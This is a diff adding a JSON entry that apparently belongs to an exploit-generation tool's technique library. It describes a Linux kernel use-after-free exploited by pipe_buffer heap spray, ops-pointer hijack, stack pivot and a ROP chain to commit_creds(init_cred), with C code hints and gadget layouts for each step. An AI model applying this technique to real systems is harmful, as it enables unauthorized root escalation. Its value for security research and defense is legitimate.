@@ -1,0 +1,51 @@
+{
+  "name": "pipe_buffer_rop",
+  "description": "UAF exploited via pipe_buffer spray. pipe_buffer is 40 bytes (kmalloc-cg-1k via pipe_inode_info, but individual buffers are in a kmalloc-1k backing array). Corrupt pipe_buf_operations pointer to hijack ->release, then pivot stack for ROP chain to commit_creds(init_cred).",
+  "target_struct": "pipe_buffer",
+  "slab_cache": "kmalloc-1k (pipe_bufs array)",
+  "technique": "pipe_buffer_ops_hijack",
+  "vuln_types": ["uaf"],
+  "kernel_versions": "4.9+",
+  "detection_rules": {
+    "required_symbols": ["pipe", "pipe2", "read", "write", "close", "splice", "fcntl"],
+    "crash_functions": ["pipe_release", "pipe_read", "pipe_write", "free_pipe_info", "alloc_pipe_info"],
+    "slab_caches": ["kmalloc-1k", "pipe_inode_info"],
+    "struct_fields": ["pipe_buffer.ops", "pipe_buffer.page", "pipe_buf_operations.release"]
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the use-after-free to free the target object while a dangling reference persists.",
+      "code_hint": "// Trigger the vulnerability to free the target slab object"
+    },
+    {
+      "name": "spray_pipe_buffers",
+      "description": "Create many pipes with fcntl(F_SETPIPE_SZ) to resize their backing pipe_buffer arrays to the target slab size. The pipe_bufs array is kmalloc'd and can reclaim the freed object.",
+      "code_hint": "#define SPRAY_PIPES 256\nint pipes[SPRAY_PIPES][2];\nfor (int i = 0; i < SPRAY_PIPES; i++) {\n    pipe(pipes[i]);\n    // Resize to get a kmalloc-1k allocation for pipe_bufs\n    fcntl(pipes[i][0], F_SETPIPE_SZ, 0x1000 * 16);\n    // Write data so pipe_buffers get populated\n    write(pipes[i][1], buf, sizeof(buf));\n}"
+    },
+    {
+      "name": "corrupt_pipe_ops",
+      "description": "Use the dangling pointer to overwrite the pipe_buffer.ops field, pointing it to a fake pipe_buf_operations structure in user-controlled memory or a ROP gadget address.",
+      "code_hint": "// Overwrite pipe_buffer.ops to point to fake_ops\nstruct fake_pipe_buf_ops {\n    void (*confirm)(void *, void *);\n    void (*release)(void *, void *);\n    void (*try_steal)(void *, void *);\n    void (*get)(void *, void *);\n};\nstruct fake_pipe_buf_ops fake_ops;\nfake_ops.release = (void *)STACK_PIVOT_GADGET;"
+    },
+    {
+      "name": "trigger_release_for_rip_control",
+      "description": "Close the pipe to trigger pipe_buf_operations->release on the corrupted pipe_buffer, gaining RIP/PC control via the fake ops table.",
+      "code_hint": "// Close pipes to trigger ops->release(pipe, buf)\nfor (int i = 0; i < SPRAY_PIPES; i++) {\n    close(pipes[i][0]);\n    close(pipes[i][1]);\n}"
+    },
+    {
+      "name": "stack_pivot",
+      "description": "Use a stack pivot gadget to redirect the kernel stack to controlled data containing the ROP chain.",
+      "code_hint": "// x86_64 example stack pivot gadgets:\n// mov rsp, [rdi+0x38]; ret  (pivot via first arg)\n// xchg rax, rsp; ret\n// On aarch64: ldp x29, x30, [x0, #OFFSET]; ret"
+    },
+    {
+      "name": "rop_to_commit_creds",
+      "description": "Execute ROP chain: commit_creds(init_cred) or find_task_by_vpid(1)->cred overwrite. Return to userspace via swapgs+iretq (x86_64) or kernel_exit (aarch64).",
+      "code_hint": "// ROP chain layout (x86_64):\n// pop rdi; ret\n// &init_cred\n// commit_creds\n// swapgs_restore_regs_and_return_to_usermode\n//\n// aarch64 equivalent:\n// set x0 = init_cred address\n// branch to commit_creds\n// return to userspace via ret_to_user"
+    }
+  ],
+  "references": [
+    "https://dirtypipe.cm4all.com/",
+    "https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html"
+  ]
+}
